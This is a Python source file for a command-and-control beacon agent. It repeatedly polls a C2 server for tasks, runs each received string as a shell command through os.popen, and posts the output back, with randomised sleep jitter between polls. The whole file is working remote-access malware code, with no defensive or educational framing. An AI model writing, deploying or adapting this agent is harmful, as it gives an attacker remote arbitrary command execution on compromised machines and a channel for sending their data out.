# === agents/lune_agent.py ===
import os
import time
import random
import requests
import json

AGENT_ID = "agent_001"
C2_URL = "http://localhost:5000"

def beacon():
    try:
        response = requests.get(f"{C2_URL}/api/update/{AGENT_ID}")
        if response.status_code == 200:
            return json.loads(response.text)
    except Exception as e:
        print(f"[!] Beacon error: {e}")
    return []

def send_result(result):
    data = {"agent_id": AGENT_ID, "result": result}
    try:
        requests.post(f"{C2_URL}/api/report", json=data)
    except Exception as e:
        print(f"[!] Send error: {e}")

def run_tasks(tasks):
    for cmd in tasks:
        try:
            output = os.popen(cmd).read()
        except Exception as e:
            output = str(e)
        send_result(output)

if __name__ == "__main__":
    while True:
        tasks = beacon()
        if tasks:
            run_tasks(tasks)
        time.sleep(random.randint(10, 30))  # Adds jitter
